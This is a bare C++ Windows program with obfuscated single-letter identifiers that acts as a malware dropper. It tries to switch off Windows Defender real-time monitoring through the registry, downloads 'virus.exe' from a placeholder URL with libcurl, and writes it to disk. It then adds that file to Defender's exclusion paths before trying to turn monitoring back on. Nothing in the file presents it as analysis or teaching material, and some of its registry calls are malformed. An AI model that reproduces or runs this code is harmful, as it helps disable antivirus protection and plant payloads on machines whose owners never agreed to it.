#include <iostream>
#include <string>
#include <fstream>
#include <sstream>
#include <curl/curl.h>
#include <Windows.h>
#include <Psapi.h>
#include <Shlobj.h>
#include <wchar.h>
#include <vector>

#define U "https://example.com/virus.exe"
#define V "virus.exe"
#define W L"D:\\security\\virus.exe"
#define X 524288

size_t Y(void* Z, size_t AA, size_t AB, std::string* AC) {
    ((std::string*)AC)->append((char*)Z, AA * AB);
    return AA * AB;
}

std::vector<unsigned char> AD(const std::string& AE) {
    std::vector<unsigned char> AF;
    CURL* AG;
    CURLcode AH;
    std::string AI;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    AG = curl_easy_init();
    if (AG) {
        curl_easy_setopt(AG, CURLOPT_URL, AE.c_str());
        curl_easy_setopt(AG, CURLOPT_WRITEFUNCTION, Y);
        curl_easy_setopt(AG, CURLOPT_WRITEDATA, &AI);
        curl_easy_setopt(AG, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(AG, CURLOPT_FAILONERROR, 1L);

        AH = curl_easy_perform(AG);
        if (AH == CURLE_OK) {
            AF.assign(AI.begin(), AI.end());
        }

        curl_easy_cleanup(AG);
    }

    curl_global_cleanup();
    return AF;
}

void AJ(const std::wstring& AK) {
    HKEY AL;
    LSTATUS AM = RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &AL, NULL);

    if (AM == ERROR_SUCCESS) {
        AM = RegSetValueExW(AL, AK.c_str(), 0, REG_SZ, reinterpret_cast<const BYTE*>(AK.c_str()), (AK.size() + 1) * sizeof(wchar_t));
        RegCloseKey(AL);
    }
}

std::wstring AN(LSTATUS AM) {
    LPVOID AO;
    DWORD AP = FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ARGUMENT_ARRAY, NULL, AM, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), reinterpret_cast<LPWSTR>(&AO), 0, NULL);
    std::wstring AQ(static_cast<const wchar_t*>(AO), AP);
    LocalFree(AO);
    return AQ;
}

int main() {
    DWORD AR;
    DWORD AS = sizeof(AR);
    LONG AT = RegGetValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", L"DisableRealtimeMonitoring", RRF_RT_REG_DWORD, NULL, &AR, &AS);
    if (AT == ERROR_SUCCESS) {
        if (AR == 0) {
            DWORD AU = 1;
            AT = RegSetValueExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring", 0, REG_DWORD, reinterpret_cast<const BYTE*>(&AU), sizeof(DWORD));
        }
    }

    std::vector<unsigned char> AV = AD(U);
    if (!AV.empty()) {
        std::ofstream AW(W, std::ios::binary);
        if (AW) {
            AW.write(reinterpret_cast<const char*>(AV.data()), AV.size());
            if (AW.good()) {
                AJ(W);
                DWORD AX = 0;
                AT = RegSetValueExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring", 0, REG_DWORD, reinterpret_cast<const BYTE*>(&AX), sizeof(DWORD));
            }
            AW.close();
        }
    }

    return 0;
}
